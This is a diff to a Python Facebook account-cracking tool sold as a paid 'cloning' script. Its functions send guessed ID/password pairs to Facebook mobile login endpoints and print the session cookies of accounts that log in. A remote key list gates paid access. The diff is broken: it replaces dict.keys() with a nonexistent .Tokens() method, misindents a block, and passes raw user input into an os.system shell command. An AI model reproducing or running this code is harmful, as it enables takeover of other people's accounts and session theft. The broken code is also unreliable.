@@ -333,7 +333,7 @@ def main():
        os.system(' ')
        menu()
     if sh =='6':
-       os.system('xdg-open https://www.facebook.com/profile.php?id=100000446995720')
+       os.system('xdg-open https://www.facebook.com/Jobaid.Nam.Toh.Sunso.E')
        main()  
 
         
@@ -680,9 +680,9 @@ def apk(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
             'viewport-width': '980',}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
+            log_cookies=session.cookies.get_dict().Tokens()
             if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                coki=";".join([Token+"="+value for Token,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
                 print(f'\033[1;92m '+uid+' | '+ps+'\33[0;92m')
                 print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
@@ -744,9 +744,9 @@ def mix(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
             'viewport-width': '980',}
             lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
+            log_cookies=session.cookies.get_dict().Tokens()
             if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                coki=";".join([Token+"="+value for Token,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
                 print(f'\033[1;92m '+uid+' | '+ps+'\33[0;92m')
                 print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
@@ -807,9 +807,9 @@ def fcrack(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
             'viewport-width': '980',}
             lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
+            log_cookies=session.cookies.get_dict().Tokens()
             if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                coki=";".join([Token+"="+value for Token,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
                 print(f'\033[1;92m [PYSCO~OK] '+uid+' | '+ps+'\33[0;92m')
                 print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
@@ -870,9 +870,9 @@ def fcrack1(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
             'viewport-width': '980',}
             lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
+            log_cookies=session.cookies.get_dict().Tokens()
             if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                coki=";".join([Token+"="+value for Token,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
                 print(f'\033[1;92m [PYSCO~OK] '+uid+' | '+ps+'\33[0;92m')
                 print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
@@ -935,9 +935,9 @@ def fcrack2(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
             'viewport-width': '980',}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
+            log_cookies=session.cookies.get_dict().Tokens()
             if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                coki=";".join([Token+"="+value for Token,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
                 print(f'\033[1;92m  [PYSCO~OK] '+uid+' | '+ps+'\33[0;92m')
                 print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
@@ -962,33 +962,33 @@ def approval():
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "4h".join(uuid)
   try:
-    httpCaht = requests.get('https://raw.githubusercontent.com/Jahidul404/apv/main/apv-a').text
+    httpCaht = requests.get('https://raw.githubusercontent.com/JOBAID-XD/Game-cloner/main/Approval.txt').text
     if id in httpCaht:
       print("\33[1;32mYour Token is Successfully Approved")
       print('\033[1;93mYour Token is Successfully Approved ')
-      psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97mYOUR KEY DONE PAID USER ADMIN PERMISSION MD JAHID ISLAM ')
+      psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97mYOUR Token DONE PAID USER ADMIN PERMISSION MD JAHID ISLAM ')
       msg = str(os.geteuid())
       time.sleep(0.03)
       print()
       pass
     else:
-      print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
-      print("\033[1;97m[\033[92;1m●\033[1;97m] Note : You Are  Not Premium User...! ")         
-      print("\033[1;97m[\033[92;1m●\033[1;97m] \033[1;97mYour Key \033[38;5;196mNot Registered ")                             
-      print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
-      print("\033[1;97m[\033[92;1m●\033[1;97m] Tools... :\033[92;1m Facebook Cloning ")
-      print('\033[1;97m[\033[92;1m●\033[1;97m] Status   :\033[38;5;196m Trail')
-      print("\033[1;97m[\033[92;1m●\033[1;97m] Your Key :\033[92;1m "+id)
-      print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
-      print('\033[1;97m[\033[92;1m●\033[1;97m]\x1b[97m\033[37;41m Note:If You Are Free User Don,t Come Inbox\033[0;m \033[1;97m[\033[92;1m●\033[1;97m]')
-      print('\033[1;97m[\033[92;1m●\033[1;97m] 7-Days Price :\033[92;1m 300 \033[1;97m[\033[92;1m●\033[1;97m] 15-Days Price :\033[92;1m 500 \033[1;97m[\033[92;1m●\033[1;97m]')
-      print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
-      print('\033[1;97m[\033[92;1m●\033[1;97m] Fb Cloning Menu')
-      print('\033[1;97m[\033[92;1m●\033[1;97m] File Create Menu')
-      print('\033[1;97m[\033[92;1m●\033[1;97m] Join Fb Group')
-      print('\033[1;97m[\033[92;1m●\033[1;97m] Exit Menu')                               
-      input('\033[1;97m[\033[92;1mENTER\033[1;97m] Upgrade Tool (\033[92;1mPremium\033[1;97m)  ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801701707661?text='+tks),approval()
+        os.system("clear")
+        print(logo)
+        print("\t\033[30m   [\033[1;32m\033[47m First Get Approvel\033[00m\033[1;30m]")
+        print ("")
+        print("┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐ \n\033[1;32m│ Note : That is Paid because 100% ok id just now login│\033[1;37m\n└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘")
+        print ("")
+        print("                Your Token is Not Approved ")
+        print("               Copy And Send Token To Admin")
+        print ("")
+        print (" Your Token : "+UMO+id)
+        print ("\n")
+        os.system("espeak \"assalamualaikum ,I am FARHAN x JOBAID er  ROBOT and my boss is FARHAN x JOBAID.Sir this tool is paid because 100% ok id just now login\"")
+        name = input(" Your Name : ")
+        os.system(f"espeak \"{name} ,prass Enter to send your Token\"")
+        print ("")
+        input(" Press Enter To Send Token")
+        os.system('xdg-open https://www.facebook.com/Jobaid.Nam.Toh.Sunso.E')
       time.sleep(1)
       approval()
   except:
